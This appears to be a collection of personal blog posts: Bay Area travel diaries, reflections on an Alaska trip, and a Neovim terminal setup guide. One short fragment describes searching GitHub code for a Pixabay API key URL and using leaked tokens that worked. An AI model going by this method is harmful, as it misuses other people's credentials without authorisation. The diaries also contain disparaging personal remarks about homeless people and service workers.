I would often\nreach no answers when pondering basic philosophical questions. And I\nthought again and again my plan to move to north Europe or Alaska.</p>\n<h3 id=\"thinking-about-buying-another-computer\">Thinking about Buying\nAnother Computer</h3>\n<p>Last night I was thinking about buying another computer to try on\ngentoo and possibly build lfs, since I don\u2019t want my computer to broke\ndown again. I need to use my computer on a daily basis and modifying the\nBIOS settings and doing stuff may cause problems. I looked for laptops\non Amazon but they are not satisfactory. I want to use the new pc to\nplay with maybe gentoo and arch and lfs and blfs.</p>\n<p>I don\u2019t need much of sound, voice, display resolution, touchscreen,\nmouse, operating system, additional keyboard features, much storage\nspace, any additional repairing stuff, or any crappy Microsoft\nservices.</p>\n<p>I need a big screen(15.6 inch at least), high processing CPU and\nlarge RAM(at least 16gb), and no hardware problems.</p>\n<p>I tried searching on Amazon but it seems pretty expensive, and the\ncheaper ones are not trustworthy. Pinebook (220 dollars) seems fine\nexcept for it\u2019s 4gb ram, and in the end I thought System76 is a good\nchoice, but it was like around 1000 to 1500 dollars, a little too\nexpensive for me.</p>\n<h3 id=\"going-to-oakland\">Going to Oakland</h3>\n<p>I was fully frustrated and decided to go out to do something but try\nmake it short, and walked to Bart station. I stepped on the first Bart\nTrain that came, and it is going to San Francisco. I don\u2019t want to go to\nSan Francisco,so I decided to go to Oakland.</p>\n<p>I first got off the Bart train at West Oakland. West Oakland looked\nvery rundown indeed, and the streets are ugly and dirty. There aren\u2019t a\nlot of people around.</p>\n<h3 id=\"7th-street\">7th Street</h3>\n<p>Then I tried walking along 7th street and went to Market Street, and\nit began to look much nicer. There is a school on Market Street and a\nKFC.</p>\n<h3 id=\"eating-in-kfc\">Eating in KFC</h3>\n<p>Then I thought that I haven\u2019t seen any KFC here in US, but a lot of\nMac Donald\u2019s. But KFC is very much popular is Shanghai indeed. And I was\na little melancholy when I thought about Shanghai. Then I went in KFC to\neat.</p>\n<p>The servant at KFC isn\u2019t very smart, and it took her a long time to\nunderstand what I am saying, and she couldn\u2019t get words straight. Also\nthe food is very expensive.</p>\n<h3 id=\"melancholy-and-thinking-of-home\">Melancholy and Thinking of\nHome</h3>\n<pre><code>    \u2026 Away from home, away from home\n    Away from home, away from home\n    Lord, I&#39;m five hundred miles away from home\n    \u2026 Not a shirt on my back\n    Not a penny to my name\n    Lord, I can&#39;t go back home this ole way\n\n    When the seas and mountains fall\n    And we come, to end of days\n    In the dark I hear a call\n    Calling me there\n    I will go there\n    And back again</code></pre>\n<h3 id=\"market-street\">Market Street</h3>\n<p>Then I walked around Market Street and it was very nice, to the point\nwhere I wouldn\u2019t mind living here actually. There are some geese in a\npark, and the streets are lined with beautiful trees and wide pavement.\nThe houses are also pretty beautiful.</p>\n<h3 id=\"homeless-camps\">Homeless Camps</h3>\n<p>Then I further walked north to 23rd street, and everything became\ndirty after that point. There are a lot of homeless people camping right\non the streets, which disgusted me.</p>\n<p>Then I walked east to San Pablo Avenue, and it was so dirty. The\nstreets are lined with homeless camps on San Pablo avenue, and smelled\nof pee and stink. I was very much annoyed indeed.</p>\n<p>Then I started running a little bit, and I run till Telegraph avenue.\nThere are a million homeless people on the streets along the way, and\nall garbage from clothes to dumped foods. There are people with obvious\nphysical problems standing in the middle of streets.</p>\n<h3 id=\"downtown-oakland\">Downtown Oakland</h3>\n<p>After walking a while on Telegraph Avenue things got better, and\nthere are many tall buildings on each way, so I reckoned it was like\ndowntown. It is kind of like San Francisco, but the streets weren\u2019t\nclean.</p>\n<h3 id=\"conclusion\">Conclusion</h3>\n<p>Anyways Oakland it not a good place I think. The west part on Market\nstreet was decent, but overall this crappy place is so bad.</p>\n<h2 id=\"visiting-walnut-creek\">9.19 Visiting Walnut Creek</h2>\n<h3 id=\"why\">Why</h3>\n<p>Yesterday I went to Oakland. Today I was still very much\nfrustrated.</p>\n<p>I went the Bart station and asked ChatGPT where to go, and it told me\nOrinda, Lafayette, Pleasanton or Walnut Creek. So I went to Walnut Creek\nby Bart.</p>\n<h3 id=\"walnut-creek-is-clean\">Walnut Creek is Clean</h3>\n<p>The Bart train went up like the hills east of the Bay Area and I came\nto Walnut Creek.</p>\n<p>Walnut Creek is very clean, which is kind of satisfactory for me. I\nlike clean places. There are no trash on the ground. Walnut Creek does\nlook affluent.</p>\n<p>There are many cars on the streets. I went to North Main Street, and\nthere is a target store. Then it was like almost 5 pm, and I decided to\neat some food as dinner/my breakfast.</p>\n<h3 id=\"dinnerbreakfast\">Dinner/Breakfast</h3>\n<p>I went into Lettuce Restaurant, and it was very clean and the\nwaitress was very nice. I ordered a sandwich and some donut, and they\ntaste very good. I paid like 16 dollars which was even cheaper than\nyesterday\u2019s stupid KFC.</p>\n<p>The houses around are really beautiful, and I thought it must be\npretty nice to live here. Everything is much better than dirty Berkeley\nor homeless Oakland, as there are just no homeless people here.There are\nreally a lot of trees.</p>\n<h3 id=\"civic-park-and-regional-trail\">Civic Park and Regional\nTrail</h3>\n<p>Then I kept walking to Civic street and went into Civic Park. There\nare so many big parking lots in Walnut Creek. I kept walking and there\nare many dogs. I hate dogs and I turned around and walked back to the\nstreets.</p>\n<p>So I walked towards the Iron Horse Regional Trail. The trail is well\nconstructed and there was an Intermediate school along the trail, and I\nwalked into the school. There are some girls kind of playing volleyball\nand some boys playing soccer. There is also a gym and there are more\npeople in the gym than outside, and I didn\u2019t remember what sports they\nare playing.</p>\n<p>I thought about doing school here and thought it pretty nice, but my\nmiddle school experience is very valuable too, and I thought how it made\nme who I am right now, caring so much about some things and being so\nsensitive, yet ignoring completely other non relevant things in life.\nAnyways it seems complicated and again Walnut Creek is very rich, my\nfamily probably couldn\u2019t afford anyways.</p>\n<p>Then I kept walking along the trail, and the small road across the\ntrail looked nice as there are many beautiful houses. People look better\ndressed than Berkeley too.</p>\n<p>Then I came to Pleasanton Hill Bart station and went home.</p>\n<h3 id=\"conclusion-1\">Conclusion</h3>\n<p>In conclusion, north California is a diverse place. I very much\nprefer Walnut Creek part and would like to visit it again. It is very\nclean, not crowded, safe, and green.</p>\n<h2 id=\"visiting-emeryville\">9.21 Visiting Emeryville</h2>\n<p>Today I went to Emeryville.</p>\n<h3 id=\"student-support\">Student Support</h3>\n<p>I had some personal problems, then I went to the student support for\nmy problems and chatted a while. The man helping me was very nice and I\nwas touched.</p>\n<h3 id=\"bestbuy-in-emeryville\">BestBuy in Emeryville</h3>\n<p>Then I took the bus F to Emeryville. I had wanted to buy a computer\nfor a while but was unsure about which to buy. I got off the bus at\nBestBuy and went in to take a look.</p>\n<p>Anyways, there are all kinds of computers in BestBuy, ranging in\nprice. I tried some briefly, trying to restart while simultaneously\npressing f12 del f2 and shift, and some have trouble booting into the\nBIOS mode. There was this 4 gb ram computer, and I tried playing a\nYouTube video with 2160p but it didn\u2019t work well, however there was this\nhuge expensive more than 2000 dollar gaming computer, and didn\u2019t play\nthe YouTube 2160p video well too, so I reckoned it was like the Wi-Fi\nconnectivity problem. The command lines and power shell in windows do\nnot work. I reckoned I want 16:9 computer since my eyes\u2019 distance are\nlong. I also wanted it to be at least 15.6 inches.</p>\n<p>Then I was trying on a Vivobook, and I booted into BIOS easily, but\nit\u2019s menu is quite strange, and I could even use the touchpad. Then I\ntried booting Ubuntu, and it worked. However at that moment a worker\ncame and said it is forbidden, and looked very much annoyed. So I ended\nup unplugging the usb, and after a while it boots into Windows\nagain.</p>\n<p>Then I asked the worker which computer is best for Linux, and he said\ndirectly there is no Linux computers, and I thought he lacked basic\nknowledge. I thought like as a worker in a computer store you would at\nleast be familiar with computers, but like they actually know\nnothing.</p>\n<p>So anyways I tried a MacBook, and I haven\u2019t tried Mac much before. I\ntried opening a terminal, but the worker came back at me and said\n\u201cprogramming\u201d is forbidden too. I thought like I couldn\u2019t live 5 seconds\nwithout terminal. Anyways I thought those workers are just as stupid\nlike those in ATT stores, and that they best work in other shops like\nclothing shops or Mac Donald\u2019s than work here, since they provide no\nknowledge of computers.</p>\n<p>Then I decided to buy a System76 computer since I do care about\nperformance, and as expensive as the computer is, it is half the price\nof a class in UC Berkeley. I don\u2019t want to waste money on a computer\nthat is hard to use.</p>\n<h3 id=\"dinner-at-chevys\">Dinner at Chevys</h3>\n<p>Then I started to dislike Best Buy a little and went out and walked a\nwhile. It became pitch dark, and I was a little afraid. Last night there\nwas a robbery at gunpoint at Berkeley, and I was always out there at 4\nor 5 am. But anyways, it is still early, and I wasn\u2019t going into any\nhomeless places.</p>\n<p>I crossed the bridge to the Bay, and went into Chevy for dinner.\nThere is loud music playing, like, deafening, and people dancing. It is\nkind of fun but I do not like loud music much, so I went and sat on the\nopposite side of the loud music and people dancing, and it seemed\nbearable. I quickly ordered a chipotle. Then after a while no waitress\ncame to deliver food, and I went to ask them, but suddenly the waitress\nhanded the food bag in my hand, then I started to eat. Despite the loud\nmusic, the food is very delicious.</p>\n<h3 id=\"emeryville-marina-park\">Emeryville Marina Park</h3>\n<p>I realized I had been to Emeryville Marina Park only once, this\nJanuary, and that I haven\u2019t been there ever since. It is dark at night,\nand seeing the waters far ahead seems like looking from a plane, with\nlow lit lights scattered across the horizon.</p>\n<h3 id=\"walking-along-the-shore\">Walking Along the Shore</h3>\n<p>Then I turned north, and started walking back to Berkeley along the\nshore. The road was dark, and along the highway there was only me, the\nBay, the sky, and dim lights. It felt so isolated, kind of like how I\nfelt walking along Huangpu River but much more. The roads went on and\nthere weren't many people. The waves were softly pushing along the\nshores on my left.</p>\n<p>Time went fast as I walked along the highway, and I reached Point\nEmery in a fairly short period. There were some cars parked there and\nfew people, who I couldn\u2019t see clearly from the dim lights. Then I\nwalked on. On my right was Aquatic Park, where I had been to like around\n3 or 4 times. But I had never been to the shoreline on the opposite side\nof Aquatic Park since it is not easily accessible. I remembered walking\non the inside of the railroad to Emeryville but not outside of the\nrailroad, and I kept walking north.</p>\n<p>The Bay at night was fascinating, and soon Emeryville Marina Park was\nnothing but some lights lined on the south of the horizon, and then the\nlights combined with the Bay Bridge and I couldn\u2019t distinguish between\nthem. 2 miles went by very quickly, and I saw the bridge to Berkeley\nPoint.</p>\n<h3 id=\"taking-bus-home\">Taking Bus Home</h3>\n<p>I remembered seeing some suspicious people on the bridge some days\nago at night who were perhaps homeless. Anyways I did not cross the\nbridge but kept on to McLaughlin Eastshore, and it was so dark I even\nfelt a little afraid, but soon came to 51B bus station. Then I took the\nbus home.</p>\n<h3 id=\"conclusion-2\">Conclusion</h3>\n<p>In conclusion, Emeryville is quite fun, and walking along the\nisolated shore at night alone is indeed a unique experience even for me\nwho likes to wander around now and then.</p>\n<h2 id=\"visiting-lafayette\">9.22 Visiting Lafayette</h2>\n<p>Today I am going to Lafayette.</p>\n<h3 id=\"emotional-problems-and-lab\">Emotional Problems and Lab</h3>\n<p>Last night I faced some emotional problems again and couldn\u2019t get any\nsleep. I attended the lab in the morning. Now its evening and I am going\nto Lafayette.</p>\n<p>Anyways let\u2019s not talk about the disappointing stuff and go back to\nour visit to Lafayette. I went to the Bart station, but it took 20\nminutes just waiting for trains. Anyways, I hopped on a Bart and went to\nLafayette.</p>\n<h3 id=\"dark-and-creepy\">Dark and Creepy</h3>\n<p>It was almost 9 pm when I arrived and it was dark. When I went out of\nthe Bart station everything looked creepy, like I could just not see\nthrough the fences.</p>\n<p>Then I walked on Mount Diablo Blvd, and there are many stalls in the\nmiddle of the road. Many people are packing their stuff in their trucks.\nI reckon it was a street market closing up.</p>\n<h3 id=\"dinner\">Dinner</h3>\n<p>Then I walked east of Mount Diablo Blvd, and every street looked\ndimly lit. I tried to find dinner, and went into local kitchens and\nbought a tortilla and some chips for dinner, then I eat as I went\naround. The food was very delicious.</p>\n<p>The streets are literally so dark in Lafayette at night. As I started\nwalking towards the Lafayette creek on Moraga Blvd I couldn\u2019t see\nanything, as the only light was from some houses, so I turned back.</p>\n<p>There wasn\u2019t much to see at night. I walked on Moraga Road and there\nwas an elementary school. Then after that the street go so dark so I\nwent to back to Mount Diablo Blvd.</p>\n<h3 id=\"safeway\">Safeway</h3>\n<p>There was a Safeway on Mount Diablo Blvd so I went inside. There was\nthis watermelon cup, and buy 2 get 1 free thing. So I went and get 3. I\nalso got some oatmeals and stuff. Safeway was open 24 hours, and I\nthought it is so nice and looked it on map, then realized there is one\nvery near my home and I didn\u2019t even know that before.</p>\n<p>Anyways as I went out I realized that the watermelon cup is very\nlarge, and one is quite enough, and I had to carry 2 of them with me. So\nI thought shopping was kind of like leaky relu in machine learning, you\ndon\u2019t necessarily get more rewards with more budget.</p>\n<p>When I walked out of the supermarket I saw some people but realized\nthey weren\u2019t homeless but normal people. And I thought Lafayette is like\none of the affluent neighborhoods around here, so that isn\u2019t much\nsurprising anyway.</p>\n<h3 id=\"deciding-to-go-back\">Deciding to Go Back</h3>\n<p>However no matter which way I walked, it is dark and creepy, and with\nfood I bought from Safeway to carry I could practically go nowhere.\nThere were still some cars in the streets though.</p>\n<p>Then I tried walking west on Mount Diablo Blvd.The people I saw when\nI first came out of the Bart Station were gone as well as their trucks.\nI couldn\u2019t go half a mile before there were no light on the streets and\nI decided to take the Bart back.</p>\n<h3 id=\"conclusion-3\">Conclusion</h3>\n<p>In conclusion, this is a somewhat unsuccessful journey, but there are\nalways ups and downs. I would probably try to plan more when visiting\nplaces at night, and choose populous places like San Francisco. Other\nthan that, the food is delicious and going to Lafayette was fun, and\nLafayette is a quiet, clean, and fine neighborhood.</p>\n<h2 id=\"visiting-orinda\">9.28 Visiting Orinda</h2>\n<p>So today I went to Orinda. The trip was postponed for 2 whole days.\nAnyways, I hopped on a Bart and went there.</p>\n<h3 id=\"orinda-village\">Orinda Village</h3>\n<p>I got off and went to Orinda Village. It was lovely village but\nrather small. The restaurants are closed at like 3 pm, but they would\nreopen at 4 or 5 pm. Anyways I went to the library. The library was very\nnice and comfortable, with free computer service and a bookshop. I\nthought about how much I enjoyed libraries like 5 or 6 years ago and\nbecame a little melancholy. The library wasn't hot at all.</p>\n<p>Orinda does seem affluent, with almost no people. The sun was\nblistering, and I felt very hot. It was like 25 degrees Celcius, and the\nsun makes it impossible for me to go uphill.</p>\n<p>There was a hill up on the left side as I walked along Orinda way,\nwhich connects to Berkeley. Then I walked to community park and there\nwere some midaged people with a lot of kids. I walked up to Holden High\nSchool, but there was no people inside.</p>\n<p>Then there wasn't anything more to see in Orinda Village. It was much\nsmaller than I had expected. So I took the bus 6. The bus didn't arrive\non time, and I was almost going for Lyft when it arrived. Anyways, I\ntook the bus and went to Moraga.</p>\n<h3 id=\"moraga\">Moraga</h3>\n<p>There is Miramount high school in Moraga and many students are\nwalking out of the high school, so I went in out of curiosity. There was\na large parking lot and many people were driving. There was a hill on\nthe back of the high school, but it was private.</p>\n<h3 id=\"no-place-for-walking\">No place for Walking</h3>\n<p>So I exited the school and started walking around Moraga, and I\nwanted to walk to Lafayette Reservoir, but it was just so hard to walk\naround. It was very hot and there were all those hills and I ran out of\nwater. Anyways so I just took the bus 6 again to Lafeyette Bart\nStation.</p>\n", "_id": "66689632547d3fe09811873b"}

Also, I heard that Fremont is really rich, so\nI wanted to there and see for myself.</p>\n<h2 id=\"how-did-i-go-there\">How did I go there?</h2>\n<p>I walked to North Berkeley Bart station (where I usually run to that\nstation at night), then took the Bart for like 30 minutes.</p>\n<h2 id=\"fremont-central-park\">Fremont Central Park</h2>\n<p>There is a beautiful park in the center, and a lake in the middle\ncalled Lake Elizabeth. The park is lovely, and many people are like\nwalking around the park. I realize there are no good parks around\nBerkeley, except for maybe Strawberry Creek Park, which is like smaller\nthan the forest area in the university. I went in and got a map of the\npark. Occasionally there are people speaking Chinese, but also some\nlooking like hispanic. There are no homeless people in the park. There\nis a series of hills across the park, and those are all yellow, which is\nkind of ugly.</p>\n<p>There are so called many activities in the central park, but I am not\ninterested in any of them.</p>\n<h2 id=\"mission-valley\">Mission Valley</h2>\n<p>After going out of the park there were no people on the roads, like\nno one at all, but there were many cars. I was wearing long sleeves and\nlong pants, and it became so hot in the late afternoon. I walked around\nMission Valley, so called \"rich neighbourhood\". Basically it is quiet\nand you do not see a lot of people on the streets (so food and restroom\nare hard to find). I figured since most people go out driving it won't\nbe a problem.</p>\n<p>However, there are many cars on the roads, like Paseo Padre Road. It\nis hard to cross the roads because there is almost no pedestrians at\nall, and I had to press the button to actually cross.</p>\n<p>There are many tall trees in the middle of the road, and overall it\nis nicer than Berkeley, but not all that good. I mean, you can see such\nneighbourhoods almost everywhere.</p>\n<h2 id=\"walking-long-distances\">Walking Long Distances</h2>\n<p>I walked around the neighbourhood, then went to Mission Community\nPark. It is overall not hilly compared to Berkeley, but traveling is\nextremely hard without a car, and in the end I walked many miles back to\nthe Bart Station, and there is a long distance between different Bart\nstations.</p>\n<p>I carried 1.5 L water and drank all the water, since there are no\ngrocery stores to refill.</p>\n<h2 id=\"dinner\">Dinner</h2>\n<p>There are, however, many restaurants out of the Bart Station, and I\nmanaged to find a very cheap and nice restaurant, and dinner cost me\naround 15 dollars, which is like the same price as Berkeley.</p>\n<p>On going back to the Bart I felt a little cold, since it was getting\ndark. I was sore and tired from walking, and there wasn't much to do and\nsee anyways.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Overall Fremont is better than Berkeley, since it is cleaner and\nthere are no homeless people. However, getting around is definitely\nharder. The scenery is medium, and those yellow hills are really ugly\nbehind the park. Overall it should be like 8 or 9 out of 10.</p>\n", "_id": "66689632547d3fe09811873c"}

Not the famed Concord near Boston,\nwhere I'd been in the summer of 2016, but the one situated north of the\nBay Area.</p>\n<h2 id=\"bart-station-gateway\">Bart Station Gateway</h2>\n<p>Upon exiting the Bart Station, I was greeted by a radiant sunny day.\nThe vibrant ambiance of Clayton Road beckoned.

The main roads teemed with\nvehicles, in stark contrast to the serene lanes nearby. Though the park\nitself seemed underpopulated with just one other visitor, a parade of\ngeese caught my attention. Their synchronized movement was so impeccable\nit reminded me of a 'geese school.' The sight was truly enchanting.</p>\n<h2 id=\"port-chicago-highway\">Port Chicago Highway</h2>\n<p>With curiosity still at its peak, I embarked on a northward journey\nup Port Chicago Hwy. The path grew challenging post-Panoramic Road, with\nthe absence of pavements and speeding cars zooming past. A somewhat\nunsettling encounter with a peculiar individual near the California\nDelta Highway quickened my pace, urging me towards the more developed\nside of the road.</p>\n<h2 id=\"glimpse-of-the-greens\">Glimpse of the Greens</h2>\n<p>Adjacent to the California Delta Highway lay an expansive golf\ncourse, a verdant expanse dotted with ponds and trees. Its beauty was\nevident, but the 'No Public Access' sign dampened my spirits. The\npotential of this space being a public park crossed my mind.</p>\n<h2 id=\"the-industrial-park-saga\">The Industrial Park Saga</h2>\n<p>Seeking another view, I made my way towards the Reservoir via Bates\nAvenue. However, the journey was less than pleasant. Industrial\nstructures loomed large, pavements were in disrepair, and the constant\nroar of vehicles was almost deafening. The one-mile trek felt laborious,\nbut the sight of the Reservoir, with its deep blue waters and distant\nmountain vistas, offered solace. Unfortunately, it too was closed to the\npublic.</p>\n<h2 id=\"homeward-bound\">Homeward Bound</h2>\n<p>Finding myself amidst the stark environment of the industrial park,\nfeeling weary and slightly disoriented, I decided it was time to\nretreat. An unusual barefoot individual crossed my path, reinforcing my\ndecision. Not in the mood for further exploration, I summoned a Lyft to\nwhisk me back to the Bart Station.</p>\n<h2 id=\"reflections\">Reflections</h2>\n<p>While Concord's downtown area radiates charm, the industrial park\nisn't conducive to leisurely walks. Future visits might benefit from\nbetter planning to truly appreciate the city's beauty. Perhaps having a\ncar would facilitate better exploration, ensuring focus on Concord's\nscenic locales.</p>\n", "_id": "66689632547d3fe09811873d"}

For example, the Gnome Desktop have a million\ndependencies, and after a while I run out of patience trying to install\nthem, so I thought no gui good enough.</p>\n<p>Without the kernel properly configured, I don't think there is much\npoint in gui anyways, and you don't need a gui for computer to\nfunction.</p>\n<h2 id=\"no-package-manager\">No Package Manager</h2>\n<p>Without package manager, I need to manually build every package.

{"title": "Configuring Terminal Emulator", "date": "Wed Oct 25 2023 03:54:28", "type": "linux", "body": "<h2 id=\"terminal-emulator\">Terminal Emulator</h2>\n<p>The default terminal emulator in GNOME, gnome-terminal, leaves a lot\nto be desired when it comes to intuitive copy-pasting. The necessity of\nusing the mouse to select text, followed by <code>ctrl+shift+c</code> to\ncopy, feels cumbersome. Moreover, navigating through it isn't as smooth\nas one would hope.</p>\n<p>My journey took me through various terminals: byobu, xterm, and\nkitty, each having their unique perks but none fitting the bill\nperfectly.</p>\n<h2 id=\"vim-as-a-savior\">Vim as a Savior?</h2>\n<p>I delved into Vim about a year ago but found myself gravitating back\nto gedit for most tasks, perhaps not having tapped into Vim's true\npotential back then. However, I've since recognized the unparalleled\nefficiency of Vim, especially for editing extensive text files in the\nterminal. Its vast array of shortcuts and keyboard bindings facilitates\nan almost mouse-free experience.</p>\n<h2 id=\"addressing-terminal-navigation\">Addressing Terminal\nNavigation</h2>\n<p>Initially, I tried <code>set -o vi</code> in the gnome terminal to\nimpart vi behavior, but it wasn't seamless. The classic jk commands,\nwhich would typically navigate lines in Vim, fetched previous commands\ninstead. Plus, unrestricted navigation through past commands was a\nchallenge, and visual mode was lackluster.</p>\n<p>This led me to explore the terminal mode in Vim, which I found a bit\ncluttered. In contrast, the terminal mode in Neovim stood out, boasting\na seamless experience. It defaults to normal mode, allowing easy\ntoggling between insert and visual modes, enhancing terminal navigation\nconsiderably.</p>\n<h2 id=\"keybinding-configuration\">Keybinding Configuration</h2>\n<p>A noteworthy tweak was adjusting the keybinding to switch to normal\nmode in the terminal. The ubiquitous esc key, though tempting, can\nconflict with other terminal processes. I remapped the caps key\nsystem-wide to f13 using <code>xmodmap ~/.Xmodmap</code> in the bashrc.\nIn my Neovim configuration (<code>~/.config/nvim/init.vim</code>), I\nadded:</p>\n<pre class=\"vim\"><code>tnoremap &lt;F13&gt; &lt;C-\\&gt;&lt;C-n&gt;\nxmap &lt;F13&gt; &lt;Esc&gt;\nset clipboard=unnamedplus</code></pre>\n<p>This setup achieves two primary goals: linking yanking and pasting in\nNeovim directly to the clipboard and utilizing the caps key as a trigger\nfor normal mode, making the workflow more fluid.</p>\n<h2 id=\"modifying-gnome-terminal\">Modifying gnome-terminal</h2>\n<p>Optimizing the gnome-terminal to launch with Neovim's terminal mode\nby default was another enhancement. Achieved with:</p>\n<pre class=\"sh\"><code>PROFILE_ID=$(gsettings get org.gnome.Terminal.ProfilesList default ` tr -d &quot;&#39;&quot;)\ngsettings set org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/ use-custom-command true\ngsettings set org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/ custom-command &#39;nvim -c &quot;term&quot; -c &quot;startinsert&quot;&#39;</code></pre>\n<h2 id=\"editing-within-neovims-terminal\">Editing Within Neovim's\nTerminal</h2>\n<p>After ensuring smooth navigation in the terminal, my next focus was\non file editors within Neovim's terminal. I noticed Vim had bugs when\nused inside the terminal, seemingly due to conflicts with Neovim.\nHowever, Neovim itself was bug-free in this context. I could use the esc\nkey to enter normal mode in the file editor, and the caps key for\nNeovim's terminal mode.</p>\n<h2 id=\"window-management-and-more\">Window Management and More</h2>\n<p>Neovim's <code>:sp</code> command comes in handy for window splits,\ncomplemented by the <code>ctrl+w w</code> navigation shortcut. This\nfeature is a boon for simultaneously handling multiple terminal sessions\nor files.</p>\n<h2 id=\"leveraging-terminal-variables\">Leveraging Terminal\nVariables</h2>\n<p>Commands like <code>!:0</code> and <code>!:1</code> after\n<code>python example.py</code> retrieve <code>python</code> and\n<code>example.py</code> respectively, while <code>!!</code> fetches the\nentire previous command. Such conveniences bolster efficiency in the\nterminal.</p>\n<h2 id=\"historical-insights-and-log-access\">Viewing History and Log\nAccess</h2>\n<p>Easily redirecting terminal history with\n<code>history &gt; ~/Downloads/history</code> has been beneficial.\nAdditionally, the alias:</p>\n<pre class=\"sh\"><code>alias jnvim=&quot;journalctl -n 1000 ` tac ` nvim -&quot;</code></pre>\n<p>added to bashrc, streamlines the process of viewing logs, making it a\ncinch.</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://help.gnome.org/users/gnome-terminal/stable/\">GNOME\nTerminal Documentation</a></li>\n<li><a href=\"https://www.vim.org/docs.php\">Vim Documentation</a></li>\n<li><a href=\"https://neovim.io/doc/user/\">Neovim Documentation</a></li>\n<li><a href=\"https://sw.kovidgoyal.net/kitty/\">Kitty Terminal</a></li>\n</ul>\n", "_id": "66689633547d3fe098118742"}

When used wget to try to\nscrap it returned 403 forbidden, so I changed the userAgent, but it\nstill returned 403, and I figured it was cloudflare protecting the\nsite.</p>\n<p>So I went to the official API page. I searched on github \"<a\nhref=\"https://pixabay.com/api/?key=\"\nclass=\"uri\">https://pixabay.com/api/?key=</a>\" and searched code,\ngetting 2k results. There are many tokens I found that worked.

Since that trip, however, I have not stayed overnight on\nany travels. While I was even planning on going to Florida in the winter\n(heard nice things about that) when I was having lunch in Denali, I lost\nthe urge later.</p>\n<h3 id=\"not-that-interested-in-a-trip\">Not that \u201cInterested\u201d in a\nTrip</h3>\n<p>Part of the reason might be I lost a lot of interest in traveling\nfrom going to Alaska because I fell so much in love with the winter\nlandscapes that other places looked trivial and not that attractive.</p>\n<p>Sometimes I went on trips to see scenic views, but they became no\nlonger appealing. Nothing I had ever seen in my life was as striking as\nthe beautiful landscapes in Alaska, those winter glaciers and mountains\nand rural towns.</p>\n<h3 id=\"feeling-guilty-of-using-parents-money-on-trips\">Feeling \u201cGuilty\u201d\nof Using Parent\u2019s Money on Trips</h3>\n<p>I spent almost 4000 dollars alone on the trip, from sky-high pricing\nof plane tickets to the minimum unoptimized living costs\u2013around 150\ndollars a day for 9 nights, plus doing all the regular activities, e.g.,\nboat cruise, flightseeing, Alaska railway. A decent trip to Alaska for\naround 10 days would cost about 4 times the pricing of a busines-level,\nlong-lasting laptop. It is a large amount of money, and it\u2019s from my\nparents, not mine.</p>\n<p>Lately, I have been feeling guilty about bulk spending my parents\u2019\nmoney, like, even if they have so much, I can\u2019t justify using it for\nenjoyment. I can use it to buy food, buy a phone, pay tuition, but go on\na high-cost trip? That sounds unreasonable.</p>\n<h3 id=\"too-much-pressure-from-school\">Too Much Pressure from\nSchool</h3>\n<p>I have faced significant challenges in schoolwork these days, and I\nstopped having that vibrant vibe. I cut traveling to face\nschoolwork.</p>\n<h2 id=\"drivers\">Drivers</h2>\n<p>So let us first reflect on the people I met on my trip.</p>\n<ul>\n<li>A taxi driver(black) working at midnight hours, taking me to the\nhotel when I arrived at Ted Stevens, somehow he mistaken me wanting to\nleave without paying, started complaining loudly(scared me a bit, until\nI paid him)</li>\n<li>A taxi driver(white) who grew up in Orange County had some houses on\nAirbnb, and had his children in a law school, taking me to the library\nin Anchorage</li>\n<li>A taxi driver(not white/black/Asian) who worked with the\nhomeless(handing them food in the winter), and urged me to get better\ngrades, taking me back to the Airbnb in Anchorage</li>\n<li>A taxi driver (not white/black/Asian), a woman individual taxi\ndriver who worked in Seward, taking people to nearby scenic attractions\nand back to their hotels</li>\n<li>A taxi driver(white), a young guy, driving me back to Fairbanks at\npast midnight</li>\n<li>A taxi driver(black), Brahima, a very friendly guy, drove me from\nFairbanks to North Pole and offered to take photos for me</li>\n<li>A bus driver(black) in Anchorage, an old woman later came onboard\nand seemed confused, he generously helped her out with the elder woman\nsaying \u201cYou made my day\u201d</li>\n<li>A bus driver(white) carrying me from Anchorage to Seward while\nmaking some commentaries</li>\n<li>A bus driver(white), elderly guy who drives around in Seward all day\nlong carrying people around</li>\n<li>Another bus driver(white) on an ATV tour from Colorado, saying he\nwent to all states except Hawaii, almost 50 years old and second year in\nAlaska</li>\n</ul>\n<p>The majority of tour guides said they worked in the lower 48 most\ntime of the year and came to Alaska only in the summer for a job.\nFurthermore, all drivers hired for tourist purposes are white, while\nsome local drivers have different ethnicities. (purely personal\nexperience)</p>\n<h2 id=\"locals-working-on-tourismnot-drivers\">Locals Working on\nTourism(Not drivers)</h2>\n<p>Then there are working local people</p>\n<ul>\n<li>Receptionist for hotels, working long hours into the night</li>\n<li>Receptionist for Tourist Services(mostly very young girls around\n17-25 years old), checking tickets, welcoming tourists, sometimes\nchatting or serving tea/drinks</li>\n<li>\u201cStatic\u201d Tour Guides, Some people who sit in a house and provide\nguidance and maps, chatting with visitors</li>\n<li>Luggage Delivery People(mostly young), driving around\ndelivering/picking up luggage</li>\n<li>Fast Food Waiters(mostly young, some older), fast food restaurant\n\u201cSubway\u201d or cheaper restaurants</li>\n<li>Fancy Restaurant Waiters(mostly very young girls around 18 years\nold), focus on giving a better experience to customers</li>\n<li>Tour Guides for the Alaska Railroad(mostly very young girls around\n18 years old), broadcasting and making jokes or explaining history or\nanecdotals, entertaining tourists along the trip, demanding jobs, switch\nto opposite train halfway from Anchorage to Denali to go home</li>\n<li>Commercial Pilots(usually mid-aged or older white male), regularly\ntaking people for glacier landings, and icefields, also serving as guide\nand electricians to maintain their own planes</li>\n<li>Boat Captain(usually mid-aged or older white male), driving the boat\nfor as much as 6 hours on a single tour, also serving as a guide\nspeaking and broadcasting about the history and the sea attractions</li>\n<li>Boat Crew Members(mostly young people), working on securing the boat\nto shore or serving food and drinks and maintaining safety, or\nentertaining tourists</li>\n<li>A UAF student(cross-dressing) working both as a hotel receptionist\nand driver to pick me up</li>\n</ul>\n<p>There is noticeably a huge proportion of young, attractive women\n(usually around 20) working the jobs of \u201cwelcoming guides\u201d or at front\ndesks, which I reckon is intended to make things more welcoming.</p>\n<h2 id=\"other-tour-guides\">Other Tour Guides</h2>\n<p>Then there are the 2 ATV guides from Miami, who have been everywhere\nin the lower 48 states, but mainly work and entertain tourists for\nmoney.</p>\n<p>There is also commercial Jeep tour drivers, and talks a lot about the\nlocal history and entertain tourists, anyway, to earn money.</p>\n<h2 